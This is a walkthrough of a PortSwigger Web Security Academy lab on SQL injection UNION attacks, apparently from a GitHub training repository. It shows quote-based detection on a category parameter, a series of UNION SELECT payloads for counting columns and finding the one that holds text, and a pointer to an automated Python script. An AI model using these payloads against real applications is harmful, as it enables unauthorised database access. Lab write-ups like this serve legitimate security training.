\+ Lab #4    : SQL injection UNION attack, finding a column containing text\
\+ Lab Level : Practitioner\
\+ Link      : https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text \

## About:
This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.<br/>

## End Goal: 
Finding a column containing text by performing a [SQL injection UNION attack](https://portswigger.net/web-security/sql-injection/union-attacks)

## Detection: 
* Submit a single quotation mark ```'``` in ```/filter?category=Gifts``` to break out the original SQL query quotation marks and cause an internal error,
* The resulting query sent by the App to the back-end databases should look to something like:
```SQL
SELECT * FROM products WHERE category = 'Gifts''
```
* The App should return a ```500 Internal Server Error```, which means that an error has occured in the back-end database while processing the query.
* The ```category``` parameter is vulnerable to SQL injection.

## Exploitation: 
### Manual: 
> :memo: **Note:** The goal of this lab is to figure out the number of columns returned by the query and then probing each column to test whether it can hold a specific string data, provided in the Lab.<br/>
> To do so, we will incrementally submit a series of ```UNION SELECT``` payloads that place the string value into each column in turn until we no longer get an ```Internal Server Error```. 

#### Determining the number of columns: 
1. Intercept the request with Burp Suite proxy,
2. Send the request to repeater,
3. Start by injecting the ```category``` parameter with ```Gifts'+UNION+SELECT+NULL--``` which will return an error
4. And then ```'UNION+SELECT+NULL,NULL--``` which will also return an error
5. And finally ```'UNION+SELECT+NULL,NULL,NULL--``` which will output the results of the original query <br/>
```SELECT * FROM products WHERE category = 'Gifts'```
> -> The number of columns is then ```3```

#### Finding columns containing text:
1. Copy the string provided in the Lab:
![String Data](https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/main/SQL%20Injection/Lab%234/2023-02-17%2018_14_48-SQL%20injection%20UNION%20attack%2C%20finding%20a%20column%20containing%20text%20%E2%80%94%20Mozilla%20Firefox.png)
> In this case, the string data is: ```VnoDqj```
2. Start by injecting the ```category``` parameter ```Gifts'+UNION+SELECT+'VnoDqj',NULL,NULL--``` which will return an error. This means that the first column is not a string
3. And then ```Gifts'+UNION+SELECT+NULL,'VnoDqj',NULL--``` which will output the results of the original query and make the database print out ```VnoDqj```. This means that the second column is a string.
4. And finally ```Gifts'+UNION+SELECT+NULL,NULL,'VnoDqj'--``` which will also return an error

> -> The ```second column``` contains string data.

### Automated:
* Refer to https://github.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/blob/main/SQL%20Injection/Lab%234/Lab-4.py
* Requirements:
```bash
pip3 install -m requirements.txt
```
* Help Menu: 
```bash
$ python3 Lab-4.py --help
usage: Lab-4.py [-h] -u URL [-n]

Usage Example: python3 Lab-4.py --url https://0a2100.web-security-academy.net/ --no-proxy

options:
  -h, --help         show this help message and exit
  -u URL, --url URL  Enter the Lab URL
  -n, --no-proxy     Do not use proxy                               
```
![Lab-4](https://user-images.githubusercontent.com/101610095/220033508-30d31320-3651-4b64-ac7b-fca9ccee1b39.gif)

